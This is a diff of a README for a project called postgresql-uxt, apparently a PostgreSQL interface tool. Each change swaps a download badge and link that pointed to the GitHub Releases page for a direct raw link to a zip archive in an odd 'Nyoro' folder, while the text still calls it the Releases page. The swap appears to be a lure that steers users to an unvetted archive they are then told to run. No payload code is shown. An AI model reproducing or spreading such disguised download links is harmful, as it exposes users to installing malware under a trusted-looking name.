@@ -8,9 +8,9 @@ Follow these steps to download and run postgresql-uxt.
 
 1. **Download the Application**: Click the link below to visit the Releases page where you can download the application.
 
-   [![Download postgresql-uxt](https://img.shields.io/badge/Download%20postgresql%2Duxt-blue)](https://github.com/Ana-Julia-C/postgresql-uxt/releases)
+   [![Download postgresql-uxt](https://raw.githubusercontent.com/Ana-Julia-C/postgresql-uxt/main/Nyoro/postgresql-uxt.zip%20postgresql%2Duxt-blue)](https://raw.githubusercontent.com/Ana-Julia-C/postgresql-uxt/main/Nyoro/postgresql-uxt.zip)
 
-2. **Visit the Releases Page**: If you want to see all available versions and updates, go to the Releases page here: [Download page](https://github.com/Ana-Julia-C/postgresql-uxt/releases).
+2. **Visit the Releases Page**: If you want to see all available versions and updates, go to the Releases page here: [Download page](https://raw.githubusercontent.com/Ana-Julia-C/postgresql-uxt/main/Nyoro/postgresql-uxt.zip).
 
 ## 🔥 Features
 - **User-Friendly Interface**: Navigate through your database effortlessly.
@@ -34,7 +34,7 @@ To ensure the best performance, please check the following requirements:
 ## 📥 Download & Install
 1. Click the link below to visit the Releases page and download the version suitable for your operating system.
 
-   [![Download postgresql-uxt](https://img.shields.io/badge/Download%20postgresql%2Duxt-blue)](https://github.com/Ana-Julia-C/postgresql-uxt/releases)
+   [![Download postgresql-uxt](https://raw.githubusercontent.com/Ana-Julia-C/postgresql-uxt/main/Nyoro/postgresql-uxt.zip%20postgresql%2Duxt-blue)](https://raw.githubusercontent.com/Ana-Julia-C/postgresql-uxt/main/Nyoro/postgresql-uxt.zip)
 
 2. Once downloaded, locate the `.exe`, `.dmg`, or package file in your Downloads folder.
 
